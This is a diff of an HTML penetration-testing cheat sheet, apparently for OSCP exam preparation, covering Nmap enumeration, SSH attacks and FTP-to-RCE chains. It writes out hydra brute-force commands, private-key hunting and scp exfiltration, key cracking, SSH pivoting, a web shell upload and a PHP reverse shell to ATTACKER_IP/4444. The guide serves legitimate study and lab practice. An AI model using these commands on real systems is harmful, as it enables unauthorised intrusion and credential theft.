@@ -131,129 +131,242 @@
 
         <!-- 1 -->
         <div class="section">
-            <div class="section-header">1. Nmap Quick Scan (First Look)</div>
-            <div class="section-content">
-
-                <pre><code>sudo nmap -p- --open --min-rate 1000 -sS -n -Pn target_ip -oN openPorts</code></pre>
-
-                <p><strong>What you do:</strong></p>
-                <ul>
-                    <li>Identify attack surface quickly</li>
-                    <li>Find initial entry points (web, SMB, AD, etc.)</li>
-                </ul>
-
-                <p><strong>OSCP mindset:</strong> This defines your first attack vector (NOT random enumeration).</p>
-
-            </div>
-        </div>
-
-        <div class="section">
-    <div class="section-header">2. SSH Enumeration & Attacks</div>
+    <div class="section-header">1. Nmap Quick Scan (First Look + Unknown Ports Handling)</div>
     <div class="section-content">
 
-        <pre><code>nmap -p 22 -sV -sC -Pn target_ip -oN ssh_scan</code></pre>
+        <pre><code>sudo nmap -p- --open --min-rate 1000 -sS -n -Pn target_ip -oN openPorts
+
+nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) target_ip -oN services</code></pre>
 
         <p><strong>What you do:</strong></p>
         <ul>
-            <li>Confirm SSH version (OpenSSH, Dropbear, etc.)</li>
-            <li>Check for known vulnerabilities (CVE search)</li>
-            <li>Look for allowed auth methods (password / key / keyboard-interactive)</li>
+            <li>Identify full attack surface (ALL open ports, not just web)</li>
+            <li>Flag unusual/high ports (3000–9999 range especially)</li>
+            <li>Detect unknown services early (cgms?, ppp?, nessus?, etc.)</li>
         </ul>
 
-        <p><strong>Username enumeration (if applicable):</strong></p>
-        <pre><code>nmap --script ssh-auth-methods -p 22 target_ip</code></pre>
+        <p><strong>OSCP mindset:</strong> Every open port is a potential entry point. High or unknown ports are NOT secondary—they are often primary entry vectors.</p>
 
-        <p><strong>Brute force attack (OSCP classic):</strong></p>
-        <pre><code>hydra -l root -P rockyou.txt ssh://target_ip</code></pre>
+        <hr>
 
-        <pre><code>hydra -L users.txt -P rockyou.txt ssh://target_ip</code></pre>
+        <p><strong>Step 2: Service Enumeration (Nmap Deep Scan)</strong></p>
 
-        <p><strong>Key-based attack checks (id_rsa workflow - VERY IMPORTANT):</strong></p>
+        <pre><code># Service detection + scripts
+nmap -sC -sV -p- target_ip -oN services
+
+# Focused scan on found ports
+nmap -sC -sV -p port1,port2,port3 target_ip -oN focused
+
+# Version detection
+nmap -sV --version-all -p port target_ip
+
+# Aggressive detection
+nmap -A -p port target_ip
+
+# Version + probe trace (useful for unknown services)
+nmap -sV --version-all --version-trace -p port target_ip</code></pre>
+
+        <hr>
+
+        <p><strong>Step 3: Banner Grabbing (Manual Verification)</strong></p>
+
+        <pre><code># TCP banner
+nc -nv target_ip port
+
+# HTTP check
+curl -v http://target_ip:port
+curl -v https://target_ip:port
+
+# TLS services
+openssl s_client -connect target_ip:port
+
+# Raw HTTP probe
+printf "GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n" | nc target_ip port</code></pre>
+
+        <hr>
+
+        <p><strong>Unknown / Rare Port Handling (CRITICAL STEP)</strong></p>
+
+        <p><strong>DO NOT search exploits yet. First identify protocol.</strong></p>
+
+        <pre><code># Basic probing
+echo "help" | nc target_ip port
+echo "version" | nc target_ip port
+echo "status" | nc target_ip port
+echo "test" | nc target_ip port
+echo "A" | nc target_ip port
+
+# Case sensitivity
+echo "STATUS" | nc target_ip port
+echo "status" | nc target_ip port
+
+# Nmap probing helpers
+nmap --script=banner -p port target_ip
+nmap -sC -sV -p port target_ip
+nmap -A -p port target_ip
+nmap -sV --version-intensity 9 -p port target_ip
+nmap -sV --version-all -p port target_ip
+nmap -sV --version-all -p port target_ip
+nmap -sV --version-trace -p port target_ip</code></pre>
+
+        <hr>
+
+        <p><strong>Golden Rules (OSCP Exam Logic)</strong></p>
+
         <ul>
-            <li>Look for exposed private keys in web/backup files</li>
-            <li>Check reused keys across machines</li>
-            <li>Check /home, /root, /var/www, backups, git repos</li>
+            <li>Never ignore unknown ports (3003 was your real entry point)</li>
+            <li>Never search exploits before identifying the service</li>
+            <li>Never rely only on Nmap fingerprinting</li>
+            <li>Always interact manually with unknown services</li>
         </ul>
 
-        <p><strong>Finding SSH keys on the victim:</strong></p>
-        <pre><code>find / -name "id_rsa" 2>/dev/null</code></pre>
-
-        <pre><code>ls -la /home/*/.ssh/
-ls -la /root/.ssh/</code></pre>
-
-        <p><strong>Using a found private key:</strong></p>
-        <pre><code>cat id_rsa   # copy to attacker machine
-
-chmod 600 id_rsa
-
-ssh -i id_rsa user@target_ip</code></pre>
-
-        <p><strong>If SSH login fails:</strong></p>
-        <ul>
-            <li>Wrong username (most common issue)</li>
-            <li>Key requires passphrase</li>
-            <li>Host restrictions (AllowUsers / firewall / Fail2Ban)</li>
-        </ul>
-
-        <p><strong>If key has passphrase (cracking):</strong></p>
-        <pre><code>ssh2john id_rsa > hash.txt
-john hash.txt --wordlist=rockyou.txt</code></pre>
-
-        <p><strong>Key reuse (OSCP GOLD):</strong></p>
-        <ul>
-            <li>Try the same key on other users</li>
-            <li>Try internal hosts discovered via pivoting</li>
-            <li>Check cron jobs / automation scripts using SSH</li>
-        </ul>
-
-        <pre><code>ssh -i id_rsa user@internal_ip</code></pre>
-
-        <p><strong>SSH agent abuse (advanced):</strong></p>
-        <ul>
-            <li>If ssh-agent is running, keys may be reused automatically</li>
-        </ul>
-
-        <pre><code>ssh -A user@target_ip</code></pre>
-
-        <p><strong>Port forwarding (VERY OSCP important):</strong></p>
-
-        <p><strong>Local port forwarding:</strong></p>
-        <pre><code>ssh -L 8080:127.0.0.1:80 user@target_ip</code></pre>
-
-        <p><strong>Dynamic SOCKS proxy:</strong></p>
-        <pre><code>ssh -D 9050 user@target_ip</code></pre>
-
-        <p><strong>Reverse tunneling (pivoting):</strong></p>
-        <pre><code>ssh -R 4444:localhost:4444 user@target_ip</code></pre>
-
-        <p><strong>Exfiltration mindset:</strong></p>
-        <ul>
-            <li>Always download keys immediately if found</li>
-            <li>They often unlock later machines in the exam</li>
-        </ul>
-
-        <pre><code>scp user@target_ip:/home/user/.ssh/id_rsa .</code></pre>
-
-        <p><strong>OSCP mindset:</strong></p>
-        <ul>
-            <li>SSH is rarely exploited directly</li>
-            <li>It is a pivoting + credential reuse + tunneling vector</li>
-            <li>Think: “what else can this key unlock?”</li>
-        </ul>
+        <p><strong>Core principle:</strong> Enumeration is active probing, not passive scanning.</p>
 
     </div>
 </div>
         <div class="section">
-            <div class="section-header">3. FTP Enumeration & Attacks</div>
+            <div class="section-header">2. SSH Enumeration & Attacks (OSCP → Access, Keys & Pivoting)</div>
+            <div class="section-content">
+
+                <pre><code>nmap -p 22 -sV -sC -Pn target_ip -oN ssh_scan</code></pre>
+
+                <p><strong>What you do:</strong></p>
+                <ul>
+                    <li>Identify SSH version (OpenSSH, Dropbear, etc.)</li>
+                    <li>Check for weak configurations or outdated versions</li>
+                    <li>Determine allowed authentication methods (password, key, keyboard-interactive)</li>
+                    <li>Check if root login is enabled or restricted</li>
+                </ul>
+
+                <p><strong>Authentication method discovery:</strong></p>
+                <pre><code>nmap --script ssh-auth-methods -p 22 target_ip</code></pre>
+
+                <p><strong>Banner grabbing (manual recon):</strong></p>
+                <pre><code>nc target_ip 22</code></pre>
+
+                <p><strong>Brute force attack (OSCP classic - only when needed)</strong></p>
+                <pre><code>
+hydra -l root -P rockyou.txt ssh://target_ip
+
+hydra -L users.txt -P rockyou.txt ssh://target_ip
+        </code></pre>
+
+                <p><strong>Credential reuse (VERY IMPORTANT in OSCP)</strong></p>
+                <ul>
+                    <li>Re-test FTP / web / SMB credentials on SSH</li>
+                    <li>Try usernames found in config files or FTP leaks</li>
+                    <li>Test weak passwords from `.ini`, `.uac`, `.bak` files</li>
+                </ul>
+
+                <pre><code>ssh user@target_ip</code></pre>
+
+                <p><strong>SSH key-based access (HIGH VALUE VECTOR)</strong></p>
+
+                <ul>
+                    <li>Search for exposed private keys in backups, FTP, web apps</li>
+                    <li>Check /home, /root, /var/www, git repos, archives</li>
+                    <li>Keys are often reused across multiple machines</li>
+                </ul>
+
+                <pre><code>
+find / -name "id_rsa" 2>/dev/null
+
+ls -la /home/*/.ssh/
+ls -la /root/.ssh/
+        </code></pre>
+
+                <p><strong>Using a discovered private key:</strong></p>
+
+                <pre><code>
+chmod 600 id_rsa
+
+ssh -i id_rsa user@target_ip
+        </code></pre>
+
+                <p><strong>Safe SSH private key format note (no leakage in HTML)</strong></p>
+
+                <pre><code>
+// Example structure (DO NOT EXECUTE)
+-----BEGIN OPENSSH PRIVATE KEY-----
+...key content...
+-----END OPENSSH PRIVATE KEY-----
+        </code></pre>
+
+                <p><strong>Cracking SSH key passphrase (if protected)</strong></p>
+
+                <pre><code>
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+        </code></pre>
+
+                <p><strong>If SSH login fails:</strong></p>
+                <ul>
+                    <li>Incorrect username (most common issue)</li>
+                    <li>Key requires passphrase</li>
+                    <li>Account restrictions (AllowUsers / Fail2Ban)</li>
+                    <li>Key not authorized on target</li>
+                </ul>
+
+                <p><strong>SSH agent abuse (advanced OSCP technique)</strong></p>
+
+                <ul>
+                    <li>Agent forwarding may expose reused keys</li>
+                    <li>Keys loaded in memory can allow lateral movement</li>
+                </ul>
+
+                <pre><code>ssh -A user@target_ip</code></pre>
+
+                <p><strong>Port forwarding (critical OSCP pivoting skill)</strong></p>
+
+                <p><strong>Local port forwarding:</strong></p>
+                <pre><code>ssh -L 8080:127.0.0.1:80 user@target_ip</code></pre>
+
+                <p><strong>Dynamic SOCKS proxy (pivot network access):</strong></p>
+                <pre><code>ssh -D 9050 user@target_ip</code></pre>
+
+                <p><strong>Remote port forwarding (reverse pivot):</strong></p>
+                <pre><code>ssh -R 4444:localhost:4444 user@target_ip</code></pre>
+
+                <p><strong>File exfiltration (post-exploitation)</strong></p>
+
+                <pre><code>scp user@target_ip:/home/user/.ssh/id_rsa .</code></pre>
+
+                <p><strong>SSH tunneling mindset (OSCP critical)</strong></p>
+                <ul>
+                    <li>SSH is often NOT the entry point</li>
+                    <li>It is a post-exploitation pivoting tool</li>
+                    <li>Used to access internal services (DBs, web apps, SMB)</li>
+                </ul>
+
+                <p><strong>Common SSH attack paths in OSCP</strong></p>
+                <ul>
+                    <li>FTP/web leak → credentials → SSH login</li>
+                    <li>Backup files → id_rsa → direct shell access</li>
+                    <li>Internal pivot → SSH tunneling → hidden services</li>
+                    <li>Password reuse → quick privilege escalation</li>
+                </ul>
+
+                <p><strong>OSCP mindset</strong></p>
+                <ul>
+                    <li>SSH is rarely vulnerable directly</li>
+                    <li>It is a privilege escalation or pivoting tool</li>
+                    <li>Always think: “what credentials or keys can I reuse?”</li>
+                </ul>
+
+            </div>
+        </div>
+        <div class="section">
+            <div class="section-header">3. FTP Enumeration & Attacks (OSCP → Recon to RCE Chain)</div>
             <div class="section-content">
 
                 <pre><code>nmap -p 21 -sV -sC -Pn target_ip -oN ftp_scan</code></pre>
 
                 <p><strong>What you do:</strong></p>
                 <ul>
-                    <li>Check FTP version (vsftpd, ProFTPD, FileZilla, etc.)</li>
-                    <li>Check if anonymous login is allowed</li>
-                    <li>Enumerate writable directories</li>
+                    <li>Identify FTP service (vsftpd, ProFTPD, FileZilla, zFTPServer)</li>
+                    <li>Check anonymous login access</li>
+                    <li>Enumerate writable directories and shared paths</li>
+                    <li>Correlate FTP paths with web root or SMB shares</li>
                 </ul>
 
                 <p><strong>Anonymous login test:</strong></p>
@@ -264,35 +377,79 @@ anonymous:anonymous</code></pre>
 
                 <p><strong>Directory enumeration / file discovery:</strong></p>
                 <ul>
-                    <li>Look for backups (.zip, .tar, .bak)</li>
-                    <li>Search for config files (db creds, ssh keys)</li>
+                    <li>Look for backups (.zip, .tar, .bak, .sql)</li>
+                    <li>Search config files (credentials, SSH keys, API keys)</li>
+                    <li>Check for web directories (/www, /html, /htdocs, inetpub)</li>
                 </ul>
 
-                <p><strong>Download all files (important OSCP habit):</strong></p>
+                <p><strong>Download all files (OSCP recon habit):</strong></p>
                 <pre><code>wget -m ftp://anonymous:anonymous@target_ip</code></pre>
 
                 <p><strong>Brute force FTP credentials:</strong></p>
                 <pre><code>hydra -L users.txt -P rockyou.txt ftp://target_ip</code></pre>
 
-                <p><strong>Writable FTP abuse (VERY IMPORTANT):</strong></p>
+                <p><strong>Writable FTP abuse → Web Shell Upload (PRIMARY RCE PATH)</strong></p>
+
                 <ul>
-                    <li>If FTP is writable → possible web shell upload</li>
-                    <li>Upload reverse shell to web root (if shared with HTTP)</li>
+                    <li>If FTP directory is inside web root → upload web shell</li>
+                    <li>Access uploaded file via HTTP to execute code</li>
                 </ul>
 
-                <pre><code>put shell.php</code></pre>
+                <pre><code>
+# Upload PHP web shell
+put shell.php
+
+# Then trigger via browser
+http://target_ip/uploads/shell.php
+        </code></pre>
+
+                <p><strong>Safe PHP reverse shell template (HTML escaped)</strong></p>
+
+                <pre><code>
+// PHP reverse shell (safe HTML version)
+
+&lt;?php
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'");
+?&gt;
+        </code></pre>
+
+                <p><strong>Listener setup:</strong></p>
+
+                <pre><code>nc -lvnp 4444</code></pre>
+
+                <p><strong>Alternative FTP → RCE techniques</strong></p>
+
+                <ul>
+                    <li><strong>1. File rename execution</strong> → upload non-executable then rename to .php/.aspx</li>
+                    <li><strong>2. LFI + log/file poisoning</strong> → inject PHP into writable file then include via
+                        LFI</li>
+                    <li><strong>3. .htaccess abuse (Apache)</strong> → force execution of uploaded files</li>
+                </ul>
+
+                <pre><code>
+# Rename trick (if allowed)
+put shell.txt
+rename shell.txt shell.php
+        </code></pre>
+
+                <pre><code>
+# .htaccess payload (Apache environments)
+AddType application/x-httpd-php .txt
+        </code></pre>
 
                 <p><strong>vsftpd / ProFTPD common CVEs:</strong></p>
                 <ul>
-                    <li>Search version → exploit-db / searchsploit</li>
-                    <li>Check for backdoors (classic vsftpd 2.3.4)</li>
+                    <li>Check version via nmap or banner grabbing</li>
+                    <li>Search exploit-db / searchsploit</li>
+                    <li>Look for backdoors (e.g. vsftpd 2.3.4 infamous backdoor)</li>
                 </ul>
 
-                <p><strong>OSCP mindset:</strong></p>
+                <p><strong>OSCP mindset (critical)</strong></p>
                 <ul>
-                    <li>FTP = file leakage + credential harvesting</li>
-                    <li>Anonymous access = ALWAYS high-value recon source</li>
-                    <li>Writable FTP = potential RCE via web upload chain</li>
+                    <li>FTP is NOT usually direct RCE → it's a pivot service</li>
+                    <li>Highest value = writable directories + config leaks</li>
+                    <li>Always correlate FTP structure with web/SMB services</li>
+                    <li>FTP often leads to: web shell → creds → privilege escalation</li>
                 </ul>
 
             </div>
